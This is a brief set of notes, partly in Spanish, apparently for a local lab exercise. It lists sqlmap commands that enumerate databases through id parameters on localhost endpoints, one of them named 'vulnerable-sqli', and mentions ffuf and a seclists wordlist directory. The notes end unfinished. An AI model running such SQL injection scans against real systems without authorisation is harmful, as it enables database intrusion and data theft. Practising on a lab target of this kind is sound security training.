# Killchain


    sqlmap -u http://localhost:8080/users?id=bfb83053-4e95-4e48-a556-7a5341628a90 --dbs


    sqlmap -u http://localhost:8080/instruments/vulnerable-sqli?id=3 --dbs


## SQLMap en el endpoint raíz buscando parámetros inyectables

    sqlmap -u "http://localhost:8080/instruments?id=1" \
    --batch \
    --dbs


    ffuf


    ls /snap/seclists/current/


1. Enumerar , inventar con un swagger.

2. 